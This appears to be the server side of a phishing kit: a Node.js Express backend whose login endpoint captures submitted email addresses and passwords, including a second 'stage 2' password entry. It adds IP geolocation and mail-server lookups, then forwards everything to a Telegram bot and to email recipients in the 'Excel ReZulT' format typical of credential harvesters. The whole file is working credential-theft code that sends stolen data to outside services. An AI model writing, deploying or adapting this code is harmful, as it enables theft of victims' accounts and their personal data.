const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE
// ============================================================

app.use(cors({
    origin: '*', // tighten this to your Netlify URL in production
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// TELEGRAM CONFIG
// ============================================================

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============================================================
// BREVO (EMAIL) CONFIG
// ============================================================

const BREVO_API_KEY = process.env.BREVO_API_KEY;
const SENDER_EMAIL = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME = process.env.SENDER_NAME || 'ABV Monitor';

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',')
    .map(e => e.trim())
    .filter(Boolean);

// ============================================================
// STARTUP CONFIG CHECK
// ============================================================

console.log('========================================');
console.log('🔍 Environment check:');
console.log(`   TELEGRAM_BOT_TOKEN: ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
console.log(`   TELEGRAM_CHAT_ID:   ${CHAT_ID ? '✅' : '❌ MISSING'}`);
console.log(`   BREVO_API_KEY:      ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   SENDER_EMAIL:       ${SENDER_EMAIL}`);
console.log(`   EMAIL_RECIPIENTS:   ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '❌ MISSING'}`);
console.log('========================================');

// ============================================================
// HELPERS
// ============================================================

async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) return false;

    const subject = `🔐 ABV Login (Stage ${stage}) - ${email}`;

    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; }
            .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
            .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
            .label { font-weight: bold; color: #555; }
            .value { color: #1e930c; font-size: 16px; }
            .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
            .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header"><h2>🔐 ABV Login Credentials (Stage ${stage})</h2></div>
            <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
            <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
            <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
            <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
            <div class="field"><div class="label">🌍 IP:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
            <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
            <div class="field"><div class="label">📱 Browser:</div><div class="value">${(userAgent || '').substring(0, 100)}...</div></div>
            <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
        </div>
    </body>
    </html>`;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject,
                htmlContent
            })
        });
        const data = await response.json();
        return response.ok;
    } catch (error) {
        console.error('❌ Brevo error:', error.message);
        return false;
    }
}

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return null;
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        return await response.json();
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return null;
    }
}

async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim();
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        return await response.json();
    } catch (error) {
        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    }
}

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'no-mx';
    } catch (error) {
        return 'MX-Error';
    }
}

// ============================================================
// HEALTH CHECK
// ============================================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length)
    });
});

// ============================================================
// LOGIN ENDPOINT (handles both stages)
// ============================================================

app.post('/api/login', async (req, res) => {
    console.log('📧 Login attempt received');
    console.log('📋 Request body:', req.body);

    const { email, password, stage = 1, firstPassword } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password required' });
    }

    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ success: false, message: 'Invalid email format' });
    }

    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    // ----- Telegram message -----
    const stageLabel = stage === 1 ? '1st Entry' : '2nd Entry';
    const telegramMessage = `
--------+ Excel ReZulT [${stageLabel}] ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
Email : ${email}
Password : ${password}
${stage === 2 ? `First Password : ${firstPassword}\n` : ''}Checker: ${email}:${password}
Browser : ${userAgent}
Language : ${acceptLanguage}
MX Record : ${mxRecord}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Date : ${new Date().toISOString()}
---------+ Excel ReZulT [${stageLabel}] ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------
`;

    console.log(`📤 Sending to Telegram (stage ${stage})...`);
    const telegramResult = await sendToTelegram(telegramMessage);

    console.log('📧 Sending email via Brevo...');
    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage);

    const telegramOK = !!(telegramResult && telegramResult.ok);
    if (telegramOK || emailResult) {
        return res.json({
            success: true,
            stage,
            message: 'Login processed',
            notifications: { telegram: telegramOK, email: emailResult }
        });
    }
    return res.status(500).json({ success: false, message: 'Failed to send notifications' });
});

// ============================================================
// 404
// ============================================================

app.use('*', (req, res) => {
    res.status(404).json({ success: false, message: `Endpoint not found: ${req.method} ${req.originalUrl}` });
});

// ============================================================
// START
// ============================================================

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

process.on('uncaughtException', (err) => console.error('❌ Uncaught:', err.message));
process.on('unhandledRejection', (r) => console.error('❌ Unhandled:', r));